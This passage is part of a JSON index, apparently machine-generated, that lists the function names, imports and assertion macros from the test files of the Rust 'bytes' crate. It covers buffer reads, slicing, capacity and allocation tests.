        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_buf.rs",
        "function_defs": [
          "fn empty_state() {",
          "fn fresh_state() {",
          "fn advance() {",
          "fn advance_to_end() {",
          "fn advance_past_end() {",
          "fn chunks_vectored_empty() {",
          "fn chunks_vectored_is_complete() {",
          "fn copy_to_slice() {",
          "fn copy_to_slice_big() {",
          "fn copy_to_slice_to_end() {",
          "fn copy_to_slice_overflow() {",
          "fn copy_to_bytes() {",
          "fn copy_to_bytes_big() {",
          "fn copy_to_bytes_to_end() {",
          "fn copy_to_bytes_overflow() {",
          "fn $ok_name() {",
          "fn $panic_name() {",
          "fn $ok_name() {",
          "fn $panic_name() {",
          "fn make_input(buf: &'static [u8]) -> &'static [u8] {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn test_deref_buf_forwards() {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, _: usize) {",
          "fn get_u8(&mut self) -> u8 {"
        ],
        "struct_defs": [
          "struct Special;"
        ],
        "impl_blocks": [
          "impl Buf for Special {"
        ],
        "uses": [
          "use ::bytes::{Buf, Bytes, BytesMut};",
          "use core::{cmp, mem};",
          "use std::collections::VecDeque;",
          "use std::io::IoSlice;",
          "use super::*;",
          "use std::io::Cursor;"
        ],
        "macros": [
          "if cfg!(target_endian = \"big\") {",
          "buf_tests!($make_input, true);",
          "assert_eq!(buf.remaining(), 0);",
          "assert!(!buf.has_remaining());",
          "assert!(buf.chunk().is_empty());",
          "assert_eq!(buf.remaining(), 64);",
          "assert!(buf.has_remaining());",
          "assert!(chunk.len() <= 64);",
          "assert!(INPUT.starts_with(chunk));",
          "assert_eq!(buf.remaining(), 64 - 8);",
          "assert!(buf.has_remaining());",
          "assert!(chunk.len() <= 64 - 8);",
          "assert!(INPUT[8..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 0);",
          "assert!(!buf.has_remaining());",
          "assert!(chunk.is_empty());",
          "assert_eq!(n, 0);",
          "assert!(bufs.iter().all(|buf| buf.is_empty()));",
          "assert!(n > 0);",
          "assert!(n <= 16);",
          "assert_eq!(bufs_concat, INPUT);",
          "assert!(bufs_concat.len() < INPUT.len());",
          "assert!(INPUT.starts_with(&bufs_concat));",
          "assert!(bufs[i].is_empty());",
          "assert_eq!(buf.remaining(), 64 - 8);",
          "assert!(buf.has_remaining());",
          "assert_eq!(chunk, INPUT[..8]);",
          "assert!(chunk.len() <= 64 - 8);",
          "assert!(INPUT[8..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 64 - 56);",
          "assert!(buf.has_remaining());",
          "assert_eq!(chunk, INPUT[..56]);",
          "assert!(chunk.len() <= 64 - 56);",
          "assert!(INPUT[56..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 0);",
          "assert!(!buf.has_remaining());",
          "assert_eq!(chunk, INPUT);",
          "assert!(buf.chunk().is_empty());",
          "assert_eq!(buf.remaining(), 64 - 8);",
          "assert!(buf.has_remaining());",
          "assert_eq!(chunk, INPUT[..8]);",
          "assert!(chunk.len() <= 64 - 8);",
          "assert!(INPUT[8..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 64 - 56);",
          "assert!(buf.has_remaining());",
          "assert_eq!(chunk, INPUT[..56]);",
          "assert!(chunk.len() <= 64 - 56);",
          "assert!(INPUT[56..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 0);",
          "assert!(!buf.has_remaining());",
          "assert_eq!(chunk, INPUT);",
          "assert!(buf.chunk().is_empty());",
          "buf_tests!(number $make_input, get_u8, get_u8_overflow, u8, get_u8, 0xff);",
          "buf_tests!(number $make_input, get_i8, get_i8_overflow, i8, get_i8, 0xffu8 as i8",
          "buf_tests!(number $make_input, get_u16_be, get_u16_be_overflow, u16, get_u16, 0x",
          "buf_tests!(number $make_input, get_u16_le, get_u16_le_overflow, u16, get_u16_le,",
          "buf_tests!(number $make_input, get_u16_ne, get_u16_ne_overflow, u16, get_u16_ne,",
          "buf_tests!(number $make_input, get_i16_be, get_i16_be_overflow, i16, get_i16, 0x",
          "buf_tests!(number $make_input, get_i16_le, get_i16_le_overflow, i16, get_i16_le,",
          "buf_tests!(number $make_input, get_i16_ne, get_i16_ne_overflow, i16, get_i16_ne,",
          "buf_tests!(number $make_input, get_u32_be, get_u32_be_overflow, u32, get_u32, 0x",
          "buf_tests!(number $make_input, get_u32_le, get_u32_le_overflow, u32, get_u32_le,",
          "buf_tests!(number $make_input, get_u32_ne, get_u32_ne_overflow, u32, get_u32_ne,",
          "buf_tests!(number $make_input, get_i32_be, get_i32_be_overflow, i32, get_i32, 0x",
          "buf_tests!(number $make_input, get_i32_le, get_i32_le_overflow, i32, get_i32_le,",
          "buf_tests!(number $make_input, get_i32_ne, get_i32_ne_overflow, i32, get_i32_ne,",
          "buf_tests!(number $make_input, get_u64_be, get_u64_be_overflow, u64, get_u64, 0x",
          "buf_tests!(number $make_input, get_u64_le, get_u64_le_overflow, u64, get_u64_le,",
          "buf_tests!(number $make_input, get_u64_ne, get_u64_ne_overflow, u64, get_u64_ne,",
          "buf_tests!(number $make_input, get_i64_be, get_i64_be_overflow, i64, get_i64, 0x",
          "buf_tests!(number $make_input, get_i64_le, get_i64_le_overflow, i64, get_i64_le,",
          "buf_tests!(number $make_input, get_i64_ne, get_i64_ne_overflow, i64, get_i64_ne,",
          "buf_tests!(number $make_input, get_u128_be, get_u128_be_overflow, u128, get_u128",
          "buf_tests!(number $make_input, get_u128_le, get_u128_le_overflow, u128, get_u128",
          "buf_tests!(number $make_input, get_u128_ne, get_u128_ne_overflow, u128, get_u128",
          "buf_tests!(number $make_input, get_i128_be, get_i128_be_overflow, i128, get_i128",
          "buf_tests!(number $make_input, get_i128_le, get_i128_le_overflow, i128, get_i128",
          "buf_tests!(number $make_input, get_i128_ne, get_i128_ne_overflow, i128, get_i128",
          "buf_tests!(number $make_input, get_f32_be, get_f32_be_overflow, f32, get_f32, f3",
          "buf_tests!(number $make_input, get_f32_le, get_f32_le_overflow, f32, get_f32_le,",
          "buf_tests!(number $make_input, get_f32_ne, get_f32_ne_overflow, f32, get_f32_ne,",
          "buf_tests!(number $make_input, get_f64_be, get_f64_be_overflow, f64, get_f64, f6",
          "buf_tests!(number $make_input, get_f64_le, get_f64_le_overflow, f64, get_f64_le,",
          "buf_tests!(number $make_input, get_f64_ne, get_f64_ne_overflow, f64, get_f64_ne,",
          "buf_tests!(var_number $make_input, get_uint_be, get_uint_be_overflow, u64, get_u",
          "buf_tests!(var_number $make_input, get_uint_le, get_uint_le_overflow, u64, get_u",
          "buf_tests!(var_number $make_input, get_uint_ne, get_uint_ne_overflow, u64, get_u",
          "buf_tests!(var_number $make_input, get_int_be, get_int_be_overflow, i64, get_int",
          "buf_tests!(var_number $make_input, get_int_le, get_int_le_overflow, i64, get_int",
          "buf_tests!(var_number $make_input, get_int_ne, get_int_ne_overflow, i64, get_int",
          "assert_eq!(buf.remaining(), 64 - mem::size_of::<$number>());",
          "assert!(buf.has_remaining());",
          "assert_eq!(value, $value);",
          "assert_eq!(buf.remaining(), 64 - $len);",
          "assert!(buf.has_remaining());",
          "assert_eq!(value, $value);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "assert!(",
          "assert!(",
          "buf_tests!(make_input, true);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input, true);",
          "unreachable!(\"remaining\");",
          "unreachable!(\"chunk\");",
          "unreachable!(\"advance\");",
          "assert_eq!(Special.get_u8(), b'x');",
          "assert_eq!((&mut Special as &mut dyn Buf).get_u8(), b'x');",
          "assert_eq!((Box::new(Special) as Box<dyn Buf>).get_u8(), b'x');",
          "assert_eq!(Box::new(Special).get_u8(), b'x');"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_bytes_odd_alloc.rs",
        "function_defs": [
          "fn sanity_check_odd_allocator() {",
          "fn test_bytes_from_vec_drop() {",
          "fn test_bytes_clone_drop() {",
          "fn test_bytes_into_vec() {",
          "fn test_bytesmut_from_bytes_vec() {",
          "fn test_bytesmut_from_bytes_arc_1() {",
          "fn test_bytesmut_from_bytes_arc_2() {",
          "fn test_bytesmut_from_bytes_arc_offset() {"
        ],
        "struct_defs": [
          "struct Odd;"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::alloc::{GlobalAlloc, Layout, System};",
          "use std::ptr;",
          "use bytes::{Bytes, BytesMut};"
        ],
        "macros": [
          "assert!(p & 0x1 == 0x1, \"{:#b}\", p);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b2), vec);",
          "assert_eq!(Vec::from(b2), vec[20..]);",
          "assert_eq!(Vec::from(b1), vec[..20]);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b2m, vec);",
          "assert_eq!(b2m, vec[20..]);",
          "assert_eq!(b1m, vec[..20]);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_bytes.rs",
        "function_defs": [
          "fn is_sync<T: Sync>() {}",
          "fn is_send<T: Send>() {}",
          "fn test_bounds() {",
          "fn test_layout() {",
          "fn from_slice() {",
          "fn fmt() {",
          "fn fmt_write() {",
          "fn len() {",
          "fn index() {",
          "fn slice() {",
          "fn slice_oob_1() {",
          "fn slice_oob_2() {",
          "fn split_off() {",
          "fn split_off_oob() {",
          "fn split_off_uninitialized() {",
          "fn split_off_to_loop() {",
          "fn split_to_1() {",
          "fn split_to_2() {",
          "fn split_to_oob() {",
          "fn split_to_oob_mut() {",
          "fn split_to_uninitialized() {",
          "fn split_off_to_at_gt_len() {",
          "fn make_bytes() -> Bytes {",
          "fn truncate() {",
          "fn freeze_clone_shared() {",
          "fn freeze_clone_unique() {",
          "fn freeze_after_advance() {",
          "fn freeze_after_advance_arc() {",
          "fn freeze_after_split_to() {",
          "fn freeze_after_truncate() {",
          "fn freeze_after_truncate_arc() {",
          "fn freeze_after_split_off() {",
          "fn fns_defined_for_bytes_mut() {",
          "fn reserve_convert() {",
          "fn reserve_growth() {",
          "fn reserve_allocates_at_least_original_capacity() {",
          "fn reserve_max_original_capacity_value() {",
          "fn reserve_vec_recycling() {",
          "fn reserve_in_arc_unique_does_not_overallocate() {",
          "fn reserve_in_arc_unique_doubles() {",
          "fn reserve_in_arc_unique_does_not_overallocate_after_split() {",
          "fn reserve_in_arc_unique_does_not_overallocate_after_multiple_splits() {",
          "fn reserve_in_arc_nonunique_does_not_overallocate() {",
          "fn reserve_shared_reuse() {",
          "fn extend_mut() {",
          "fn extend_from_slice_mut() {",
          "fn extend_mut_from_bytes() {",
          "fn extend_past_lower_limit_of_size_hint() {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn extend_mut_without_size_hint() {",
          "fn from_static() {",
          "fn advance_static() {",
          "fn advance_vec() {",
          "fn advance_bytes_mut() {",
          "fn advance_bytes_mut_remaining_capacity() {",
          "fn advance_past_len() {",
          "fn stress() {",
          "fn partial_eq_bytesmut() {",
          "fn bytes_mut_unsplit_basic() {",
          "fn bytes_mut_unsplit_empty_other() {",
          "fn bytes_mut_unsplit_empty_self() {",
          "fn bytes_mut_unsplit_other_keeps_capacity() {",
          "fn bytes_mut_unsplit_empty_other_keeps_capacity() {",
          "fn bytes_mut_unsplit_arc_different() {",
          "fn bytes_mut_unsplit_arc_non_contiguous() {",
          "fn bytes_mut_unsplit_two_split_offs() {",
          "fn from_iter_no_size_hint() {",
          "fn test_slice_ref(bytes: &Bytes, start: usize, end: usize, expected: &[u8]) {",
          "fn slice_ref_works() {",
          "fn slice_ref_empty() {",
          "fn slice_ref_empty_subslice() {",
          "fn slice_ref_catches_not_a_subset() {",
          "fn slice_ref_not_an_empty_subset() {",
          "fn empty_slice_ref_not_an_empty_subset() {",
          "fn bytes_buf_mut_advance() {",
          "fn bytes_buf_mut_reuse_when_fully_consumed() {",
          "fn bytes_reserve_overflow() {",
          "fn bytes_with_capacity_but_empty() {",
          "fn bytes_put_bytes() {",
          "fn box_slice_empty() {",
          "fn bytes_into_vec() {",
          "fn test_bytes_into_vec() {",
          "fn test_bytes_into_vec_promotable_even() {",
          "fn test_bytes_vec_conversion() {",
          "fn test_bytes_mut_conversion() {",
          "fn test_bytes_capacity_len() {",
          "fn static_is_unique() {",
          "fn vec_is_unique() {",
          "fn arc_is_unique() {",
          "fn shared_is_unique() {",
          "fn mut_shared_is_unique() {",
          "fn test_bytesmut_from_bytes_static() {",
          "fn test_bytesmut_from_bytes_bytes_mut_vec() {",
          "fn test_bytesmut_from_bytes_bytes_mut_shared() {",
          "fn test_bytesmut_from_bytes_bytes_mut_offset() {",
          "fn test_bytesmut_from_bytes_promotable_even_vec() {",
          "fn test_bytesmut_from_bytes_promotable_even_arc_1() {",
          "fn test_bytesmut_from_bytes_promotable_even_arc_2() {",
          "fn test_bytesmut_from_bytes_promotable_even_arc_offset() {",
          "fn try_reclaim_empty() {",
          "fn try_reclaim_vec() {",
          "fn try_reclaim_arc() {",
          "fn split_off_empty_addr() {",
          "fn split_to_empty_addr() {",
          "fn split_off_empty_addr_mut() {",
          "fn split_to_empty_addr_mut() {",
          "fn new(buf: [u8; L], drop_count: SharedAtomicCounter) -> Self {",
          "fn as_ref(&self) -> &[u8] {",
          "fn drop(&mut self) {",
          "fn owned_is_unique_always_false() {",
          "fn owned_buf_sharing() {",
          "fn owned_buf_slicing() {",
          "fn owned_dropped_exactly_once() {",
          "fn owned_to_mut() {",
          "fn owned_to_vec() {",
          "fn owned_into_vec() {",
          "fn owned_safe_drop_on_as_ref_panic() {"
        ],
        "struct_defs": [
          "struct Iter<I>(I);",
          "struct SharedAtomicCounter(Arc<AtomicUsize>);",
          "struct OwnedTester<const L: usize> {"
        ],
        "impl_blocks": [
          "impl SharedAtomicCounter {"
        ],
        "uses": [
          "use bytes::{Buf, BufMut, Bytes, BytesMut};",
          "use std::sync::atomic::{AtomicUsize, Ordering};",
          "use std::sync::Arc;",
          "use std::panic::{self, AssertUnwindSafe};",
          "use std::usize;",
          "use std::mem;",
          "use std::fmt::Write;",
          "use std::iter::FromIterator;",
          "use std::panic;",
          "use std::sync::{Arc, Barrier};",
          "use std::thread;",
          "use std::iter;",
          "use bytes::{Buf, BytesMut};"
        ],
        "macros": [
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(a, b\"abcdefgh\"[..]);",
          "assert_eq!(a, &b\"abcdefgh\"[..]);",
          "assert_eq!(a, Vec::from(&b\"abcdefgh\"[..]));",
          "assert_eq!(b\"abcdefgh\"[..], a);",
          "assert_eq!(&b\"abcdefgh\"[..], a);",
          "assert_eq!(Vec::from(&b\"abcdefgh\"[..]), a);",
          "assert_eq!(a, b\"abcdefgh\"[..]);",
          "assert_eq!(a, &b\"abcdefgh\"[..]);",
          "assert_eq!(a, Vec::from(&b\"abcdefgh\"[..]));",
          "assert_eq!(b\"abcdefgh\"[..], a);",
          "assert_eq!(&b\"abcdefgh\"[..], a);",
          "assert_eq!(Vec::from(&b\"abcdefgh\"[..]), a);",
          "let a = format!(\"{:?}\", Bytes::from(&b\"abcdefg\"[..]));",
          "assert_eq!(a, b);",
          "let a = format!(\"{:?}\", BytesMut::from(&b\"abcdefg\"[..]));",
          "assert_eq!(a, b);",
          "write!(a, \"{}\", &s[..64]).unwrap();",
          "assert_eq!(a, s[..64].as_bytes());",
          "write!(b, \"{}\", &s[..32]).unwrap();",
          "write!(b, \"{}\", &s[32..64]).unwrap();",
          "assert_eq!(b, s[..64].as_bytes());",
          "write!(c, \"{}\", s).unwrap();",
          "assert_eq!(c, s[..].as_bytes());",
          "assert_eq!(a.len(), 7);",
          "assert_eq!(a.len(), 7);",
          "assert!(a.is_empty());",
          "assert!(a.is_empty());",
          "assert_eq!(a[0..5], *b\"hello\");",
          "assert_eq!(b, b\"lo\"[..]);",
          "assert_eq!(b, b\"\"[..]);",
          "assert_eq!(b, b\"\"[..]);",
          "assert_eq!(b, b\"\"[..]);",
          "assert_eq!(b, b\"hello\"[..]);",
          "assert_eq!(b, b\"lo world\"[..]);",
          "assert_eq!(hello, &b\"hello\"[..]);",
          "assert_eq!(world, &b\"world\"[..]);",
          "assert_eq!(hello, &b\"hello\"[..]);",
          "assert_eq!(world, &b\"world\"[..]);",
          "assert_eq!(bytes.len(), 0);",
          "assert_eq!(bytes.capacity(), 128);",
          "assert_eq!(other.len(), 0);",
          "assert_eq!(other.capacity(), 896);",
          "assert_eq!(i, bytes.len());",
          "assert_eq!(&s[..], &sum[..]);",
          "assert_eq!(i, bytes.len());",
          "assert_eq!(&s[..], &sum[..]);",
          "assert_eq!(i, off.len());",
          "assert_eq!(&s[..], &sum[..]);",
          "assert_eq!(i, off.len());",
          "assert_eq!(&s[..], &sum[..]);",
          "assert_eq!(SHORT[4..], a);",
          "assert_eq!(SHORT[..4], b);",
          "assert_eq!(LONG[4..], a);",
          "assert_eq!(LONG[..4], b);",
          "assert_eq!(LONG[30..], a);",
          "assert_eq!(LONG[..30], b);",
          "assert_eq!(LONG, a);",
          "assert_eq!(LONG[1..], a);",
          "assert!(panic::catch_unwind(move || {",
          "assert!(panic::catch_unwind(move || {",
          "assert_eq!(hello, s);",
          "assert_eq!(hello, s);",
          "assert_eq!(hello, \"hello\");",
          "assert_eq!(b, s);",
          "assert_eq!(c, s);",
          "assert_eq!(b, s);",
          "assert_eq!(c, s);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(&v[..], bytes);",
          "assert_eq!(bytes.capacity(), LONG.len() + 64);",
          "assert!(bytes.capacity() >= bytes.len() + 128);",
          "assert_eq!(bytes.capacity(), 117);",
          "assert_eq!(bytes.capacity(), 1024);",
          "assert_eq!(bytes.capacity(), 64 * 1024);",
          "assert_eq!(bytes.capacity(), 16);",
          "assert_eq!(bytes.as_ptr() as usize, addr);",
          "assert_eq!(bytes.capacity(), 6);",
          "assert_eq!(bytes.capacity(), 16);",
          "assert_eq!(bytes.as_ptr() as usize, addr);",
          "assert_eq!(1000, bytes.capacity());",
          "assert_eq!(2001, bytes.capacity());",
          "assert_eq!(1000, bytes.capacity());",
          "assert_eq!(2000, bytes.capacity());",
          "assert_eq!(bytes.capacity(), orig_capacity);",
          "assert_eq!(bytes.capacity(), orig_capacity);",
          "assert_eq!(1000, bytes.capacity());",
          "assert_eq!(2001, bytes.capacity());",
          "assert_eq!(&*bytes, b\"!123ex123\");",
          "assert_eq!(&*bytes, b\"!123ex123\");",
          "assert_eq!(bytes.capacity(), 2009);",
          "assert_eq!(*bytes, LONG[..]);",
          "assert_eq!(LONG[..], *bytes);",
          "assert_eq!(*bytes, LONG[..]);",
          "assert_eq!(bytes.len(), 10);",
          "assert_eq!(*bytes, LONG[..]);",
          "assert_eq!(a, b\"a\"[..]);",
          "assert_eq!(b, b\"b\"[..]);",
          "assert_eq!(a, &b\"world\"[..]);",
          "assert_eq!(a, b\"o yah world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"h world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"d zomg wat wat\"[..]);",
          "assert_eq!(a, b\"o yah world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"h world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"h world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"d zomg wat wat\"[..]);",
          "let max_capacity = if cfg!(miri) { 16 } else { 256 };",
          "eprintln!(\"testing capacity={capacity}, len={len}, advance={advance}\");",
          "assert_eq!(buf.len(), len, \"resize should write `len` bytes\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "const ITERS: usize = if cfg!(miri) { 100 } else { 1_000 };",
          "assert_eq!(*buf, data[..]);",
          "assert!(bytes == bytesmut);",
          "assert!(bytesmut == bytes);",
          "assert!(bytes2 != bytesmut);",
          "assert!(bytesmut != bytes2);",
          "assert_eq!(b\"aaabbb\", &buf[..]);",
          "assert_eq!(b\"cccddd\", &splitted[..]);",
          "assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "assert_eq!(buf.capacity(), 64);",
          "assert_eq!(buf.capacity(), 64);",
          "assert_eq!(b\"aaaabbbbccccdddd\", &buf[..]);",
          "assert_eq!(b\"aaaabbbbccccdddd\", &buf[..]);",
          "assert_eq!(b\"aaaabbbbccccdddd\", &buf[..]);",
          "assert_eq!(&actual[..], &expect[..]);",
          "assert_eq!(&sub[..], expected);",
          "assert_eq!(&sub[..], b\"\");",
          "assert_eq!(Bytes::new(), bytes.slice_ref(slice));",
          "assert_eq!(Bytes::new(), bytes.slice_ref(slice));",
          "assert_eq!(Bytes::new(), bytes.slice_ref(slice));",
          "assert_eq!(1024, bytes.chunk_mut().len());",
          "assert_eq!(1024 - 10, bytes.chunk_mut().len());",
          "assert_eq!(ptr.offset(10), next);",
          "assert_eq!(1024, bytes.chunk_mut().len());",
          "assert_eq!(&buf[0] as *const u8, p);",
          "assert_eq!([17, 19, 19], bytes.as_ref());",
          "assert!(b.is_empty());",
          "assert_eq!(&vec, content);",
          "assert_eq!(&vec, content);",
          "assert_eq!(&vec, content);",
          "assert_eq!(&vec, prefix);",
          "assert_eq!(&*vec, bs);",
          "eprintln!(\"1\");",
          "eprintln!(\"2\");",
          "eprintln!(\"3\");",
          "eprintln!(\"4\");",
          "eprintln!(\"{:#?}\", (&*b1).as_ptr());",
          "eprintln!(\"5\");",
          "assert_eq!(&*Vec::from(b2), bs);",
          "eprintln!(\"6\");",
          "assert_eq!(&*Vec::from(b1), bs);",
          "assert_eq!(Vec::from(b2), bs[9..]);",
          "assert_eq!(Vec::from(b1), bs[..9]);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b2), vec);",
          "assert_eq!(Vec::from(b2), vec[20..]);",
          "assert_eq!(Vec::from(b1), vec[..20]);",
          "assert_eq!(v.len(), 7);",
          "assert_eq!(v.capacity(), 10);",
          "assert_eq!(v.len(), 6);",
          "assert_eq!(v.capacity(), 10);",
          "assert_eq!(v.as_slice(), b\"bcdefg\");",
          "assert_eq!(v.len(), 7);",
          "assert_eq!(v.capacity(), 10);",
          "assert_eq!(v.len(), 6);",
          "assert_eq!(v.capacity(), 10);",
          "assert_eq!(v.as_slice(), b\"bcdefg\");",
          "assert!(!b.is_unique());",
          "assert!(b.is_unique());",
          "assert!(!b.is_unique());",
          "assert!(b.is_unique());",
          "assert!(!c.is_unique());",
          "assert!(c.is_unique());",
          "assert!(!c.is_unique());",
          "assert!(c.is_unique());",
          "assert_eq!(bytes_mut, bs[..]);",
          "assert_eq!(bytes_mut, bs[..]);",
          "assert_eq!(bytes_mut, bs_long[..]);",
          "assert_eq!(b1m, bs[..]);",
          "assert_eq!(b2m, bs[..]);",
          "assert_eq!(b2m, bs[9..]);",
          "assert_eq!(b1m, bs[..9]);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b2m, vec);",
          "assert_eq!(b2m, vec[20..]);",
          "assert_eq!(b1m, vec[..20]);",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(true, buf.try_reclaim(6));",
          "assert!(cap >= 6);",
          "assert_eq!(false, buf.try_reclaim(cap + 1));",
          "assert!(cap >= 6);",
          "assert_eq!(0, split.capacity());",
          "assert_eq!(true, split.try_reclaim(6));",
          "assert_eq!(false, split.try_reclaim(cap + 1));",
          "assert_eq!(false, buf.try_reclaim(usize::MAX));",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(4, buf.capacity());",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(true, buf.try_reclaim(5));",
          "assert_eq!(true, buf.try_reclaim(6));",
          "assert_eq!(6, buf.capacity());",
          "assert_eq!(false, buf.try_reclaim(usize::MAX));",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(true, buf.try_reclaim(6));",
          "assert_eq!(6, buf.capacity());",
          "assert_eq!(0, buf.len());",
          "assert_eq!(6, buf.capacity());",
          "assert_eq!(6, buf.len());",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(true, buf.try_reclaim(4));",
          "assert_eq!(true, buf.try_reclaim(6));",
          "assert_eq!(empty_end.len(), 0);",
          "assert_eq!(empty_end.as_ptr(), ptr_end);",
          "assert_eq!(buf.len(), 0);",
          "assert_eq!(buf.as_ptr(), ptr_start);",
          "assert_eq!(empty_start.len(), 0);",
          "assert_eq!(empty_start.as_ptr(), ptr_start);",
          "assert_eq!(buf.len(), 0);",
          "assert_eq!(buf.as_ptr(), ptr_end);",
          "assert_eq!(empty_end.len(), 0);",
          "assert_eq!(empty_end.as_ptr(), ptr_end);",
          "assert_eq!(buf.len(), 0);",
          "assert_eq!(buf.as_ptr(), ptr_start);",
          "assert_eq!(empty_start.len(), 0);",
          "assert_eq!(empty_start.as_ptr(), ptr_start);",
          "assert_eq!(buf.len(), 0);",
          "assert_eq!(buf.as_ptr(), ptr_end);",
          "panic!(\"test-triggered panic in `AsRef<[u8]> for OwnedTester`\");",
          "assert!(!b1.is_unique()); // even if ref_cnt == 1",
          "assert!(!b1.is_unique());",
          "assert!(!b2.is_unique());",
          "assert!(!b2.is_unique()); // even if ref_cnt == 1",
          "assert_eq!(&buf[..], &b1[..]);",
          "assert_eq!(&buf[..], &b2[..]);",
          "assert_eq!(b1.as_ptr(), b2.as_ptr());",
          "assert_eq!(b1.len(), b2.len());",
          "assert_eq!(b1.len(), buf.len());",
          "assert_eq!(SHORT, &b1[..]);",
          "assert_eq!(&SHORT[1..(SHORT.len() - 1)], b2);",
          "assert_eq!(unsafe { SHORT.as_ptr().add(1) }, b2.as_ptr());",
          "assert_eq!(SHORT.len() - 2, b2.len());",
          "assert_eq!(drop_counter.get(), 0);",
          "assert_eq!(drop_counter.get(), 0);",
          "assert_eq!(drop_counter.get(), 0);",
          "assert_eq!(drop_counter.get(), 1);",
          "assert_eq!(new_buf, &buf[..]);",
          "assert_eq!(drop_counter.get(), 1);",
          "assert_eq!(&v1[..], &buf[..]);",
          "assert_eq!(&v1[..], &b1[..]);",
          "assert_eq!(drop_counter.get(), 1);",
          "assert_eq!(&v1[..], &buf[..]);",
          "assert_eq!(drop_counter.get(), 1);",
          "assert!(result.is_err());",
          "assert_eq!(drop_counter.get(), 1);"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]"
        ],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_debug.rs",
        "function_defs": [
          "fn fmt() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::Bytes;"
        ],
        "macros": [
          "assert_eq!(expected, format!(\"{:?}\", Bytes::from(vec)));"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_iter.rs",
        "function_defs": [
          "fn iter_len() {",
          "fn empty_iter_len() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::{buf::IntoIter, Bytes};"
        ],
        "macros": [
          "assert_eq!(iter.size_hint(), (11, Some(11)));",
          "assert_eq!(iter.len(), 11);",
          "assert_eq!(iter.size_hint(), (0, Some(0)));",
          "assert_eq!(iter.len(), 0);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/tests/test_reader.rs",
        "function_defs": [
          "fn read() {",
          "fn buf_read() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io::{BufRead, Read};",
          "use bytes::Buf;"
        ],
        "macros": [
          "assert_eq!(b\"hello world\", &buffer[..]);",
          "assert_eq!(\"hello\\n\", &line);",
          "assert_eq!(\"world\", &line);"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
